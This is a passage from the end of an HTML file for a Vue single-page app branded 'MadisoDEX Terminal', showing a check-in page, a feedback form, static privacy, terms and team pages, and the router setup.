            </div>
          </div>

          <!-- Inbox Modal -->
          <div class="modal-mask" v-if="showInboxModal" @click.self="showInboxModal = false">
            <div class="modal-content">
              <h3 style="font-size: 18px; font-weight: 700; margin-bottom: 8px;">Welcome to MadisoDEX</h3>
              <p style="font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 20px;">
                Thank you for installing MadisoDEX Terminal. Our platform provides high-speed market updates, secure local analytics, and real-time calculation tools.
              </p>
              <button class="glass-btn" @click="showInboxModal = false">Close</button>
            </div>
          </div>
        </div>
      `
    };

    // --- SETTINGS SUB-PAGES ---
    // 4.7 Monthly Check-in Component
    const CheckInPage = {
      setup() {
        const checked = ref(localStorage.getItem('checkin_status') === 'true');
        const handleCheckin = () => {
          checked.value = true;
          localStorage.setItem('checkin_status', 'true');
          showToast('Check-in Successful!');
        };
        return { checked, handleCheckin };
      },
      template: `
        <div class="main-view no-tab">
          <div class="nav-header">
            <button class="back-btn" @click="$router.back()">&larr;</button>
            <h2>Monthly Check-in</h2>
            <div style="width: 36px;"></div>
          </div>
          <div style="padding: 20px; text-align: center;">
            <div class="glass-card" style="padding: 32px 20px;">
              <div style="font-size: 48px; margin-bottom: 12px;">📅</div>
              <h3 style="font-size: 20px; font-weight: 700; margin-bottom: 8px;">Daily Rewards Calendar</h3>
              <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 24px;">Sign in daily to track your portfolio analysis momentum.</p>
              <button class="glass-btn" :disabled="checked" @click="handleCheckin">
                {{ checked ? 'Already Checked In Today' : 'Claim Daily Check-in' }}
              </button>
            </div>
          </div>
        </div>
      `
    };

    // 4.8 Feedback Component
    const FeedbackPage = {
      setup() {
        const router = useRouter();
        const title = ref('');
        const content = ref('');
        const isValid = computed(() => title.value.trim().length > 0 && content.value.trim().length > 0);

        const submitFeedback = () => {
          if (!isValid.value) return;
          showToast('Feedback submitted successfully!');
          title.value = '';
          content.value = '';
          setTimeout(() => router.back(), 1000);
        };

        return { title, content, isValid, submitFeedback };
      },
      template: `
        <div class="main-view no-tab">
          <div class="nav-header">
            <button class="back-btn" @click="$router.back()">&larr;</button>
            <h2>Customer Feedback</h2>
            <div style="width: 36px;"></div>
          </div>
          <div style="padding: 20px;">
            <div class="glass-card">
              <label style="font-size: 12px; color: var(--text-muted);">Subject
                <input v-model="title" type="text" placeholder="Brief title..." class="glass-input">
              </label>
              <label style="font-size: 12px; color: var(--text-muted);">Message Content
                <textarea v-model="content" rows="5" placeholder="Describe your issue or suggestion..." class="glass-input" style="resize: none;"></textarea>
              </label>
              <button class="glass-btn" :disabled="!isValid" @click="submitFeedback">Submit Feedback</button>
            </div>
          </div>
        </div>
      `
    };

    // Static Legal/Info Pages
    const PrivacyPage = {
      template: `
        <div class="main-view no-tab">
          <div class="nav-header"><button class="back-btn" @click="$router.back()">&larr;</button><h2>Privacy Policy</h2><div style="width: 36px;"></div></div>
          <div style="padding: 20px;"><div class="glass-card" style="font-size: 13px; line-height: 1.6; color: var(--text-muted);">
            <p style="margin-bottom: 12px; color: #fff; font-weight: 600;">Data Privacy Notice</p>
            MadisoDEX respects user privacy. All calculated analytical metrics, financial key checks, and portfolio settings are computed locally on your device. No private key data or inputted numbers leave the runtime sandbox.
          </div></div>
        </div>
      `
    };

    const TermsPage = {
      template: `
        <div class="main-view no-tab">
          <div class="nav-header"><button class="back-btn" @click="$router.back()">&larr;</button><h2>Terms of Service</h2><div style="width: 36px;"></div></div>
          <div style="padding: 20px;"><div class="glass-card" style="font-size: 13px; line-height: 1.6; color: var(--text-muted);">
            <p style="margin-bottom: 12px; color: #fff; font-weight: 600;">Terms & Conditions</p>
            By using MadisoDEX, you acknowledge that financial estimations and market figures provided in this application are for analytical and informational purposes only and do not constitute financial advice.
          </div></div>
        </div>
      `
    };

    const TeamPage = {
      template: `
        <div class="main-view no-tab">
          <div class="nav-header"><button class="back-btn" @click="$router.back()">&larr;</button><h2>About Team</h2><div style="width: 36px;"></div></div>
          <div style="padding: 20px;"><div class="glass-card" style="text-align: center;">
            <h3 style="font-size: 18px; font-weight: 700; margin-bottom: 6px;">MadisoDEX Engineering</h3>
            <p style="font-size: 13px; color: var(--text-muted);">Dedicated to lightweight, decentralized, and high-performance financial web tools.</p>
          </div></div>
        </div>
      `
    };

    // --- VUE ROUTER CONFIGURATION ---
    const routes = [
      { path: '/', component: LoadingPage },
      { path: '/home', component: HomePage },
      { path: '/stock/:symbol', component: StockDetailPage },
      { path: '/feature/:type', component: FeatureSubPage },
      { path: '/toolbox', component: ToolboxPage },
      { path: '/settings', component: SettingsPage },
      { path: '/checkin', component: CheckInPage },
      { path: '/feedback', component: FeedbackPage },
      { path: '/privacy', component: PrivacyPage },
      { path: '/terms', component: TermsPage },
      { path: '/team', component: TeamPage }
    ];

    const router = createRouter({
      history: createWebHashHistory(),
      routes
    });

    // --- APP CREATION ---
    const app = createApp({
      setup() {
        const route = useRoute();
        // Hide Tab Bar on Loading and Sub-pages
        const showTabBar = computed(() => ['/home', '/toolbox', '/settings'].includes(route.path));
        return { showTabBar, toastMsg: globalToast };
      }
    });

    app.use(router);
    app.mount('#app');
  </script>
</body>
</html>
